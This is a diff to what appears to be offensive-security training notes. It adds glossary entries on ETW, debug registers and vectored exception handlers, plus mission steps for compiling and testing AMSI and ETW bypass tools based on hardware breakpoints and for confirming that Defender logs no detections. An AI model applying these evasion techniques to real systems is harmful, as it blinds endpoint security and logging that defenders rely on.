+| **EtwEventWrite** | User-mode function in ntdll.dll through which all ETW events pass before reaching the kernel |
+| **NtTraceEvent** | Syscall that EtwEventWrite calls to write events to the kernel ETW buffer |
+| **Hardware breakpoint** | CPU-native breakpoint using DR0-DR3 registers; fires EXCEPTION_SINGLE_STEP without modifying code |
+| **DR0-DR3** | Debug address registers — hold the addresses of up to four hardware breakpoints |
+| **DR7** | Debug control register — enables/disables each DR breakpoint and sets condition (execution, write, read/write) |
+| **VEH** | Vectored Exception Handler — exception handler registered via AddVectoredExceptionHandler; runs before SEH, first in chain |
+| **EXCEPTION_SINGLE_STEP** | Windows exception code raised when a hardware breakpoint fires or TF flag triggers; caught by VEH handler |
+| **E_INVALIDARG** | HRESULT 0x80070057 — "invalid argument" error; returned by AMSI bypass to make PowerShell treat the scan as inconclusive |
+| **SetThreadContext** | Win32 API to write CPU register values including DR0-DR7; used to arm hardware breakpoints without kernel access |
+| **HWBP** | Hardware breakpoint — shorthand for DR register-based breakpoint technique |
 
 ---
 
@@ -1347,11 +2209,24 @@ Your missions:
    to list all registered process creation callbacks. Identify which
    belong to EDR-like components vs native OS. Document each entry.
 
-The goal of step 4-5 is to train DETECTION awareness alongside technique
+6. **AMSI HWBP bypass**: Compile amsi_hwbp.exe from source. Run with `--test`.
+   Confirm output shows "BYPASS CONFIRMED". Verify amsi.dll file hash matches
+   before and after (zero memory modification). Run `Get-MpThreatDetection` and
+   confirm no detections triggered.
+
+7. **ETW bypass**: Compile etw_hwbp.exe. Run with `--test`. Open Event Viewer
+   and confirm that PowerShell-sourced ETW events disappear from the stream
+   while the bypass is active. Remove the bypass and confirm events resume.
+
+The goal of steps 4-5 is to train DETECTION awareness alongside technique
 knowledge. Every technique you deploy will be visible to these tools
 in a forensic scenario. Know your trace before you leave it.
+
+Steps 6-7 are the new capability layer — user-mode evasion BEFORE kernel
+techniques are needed. These run as standard user, no driver, no BSOD risk.
+Build them first.
 
 ---
 
 — data structures SEVERED from the list, still breathing,
-the census taker counts what the architecture chooses to show
+the census taker counts what the ARCHITECTURE chooses to show
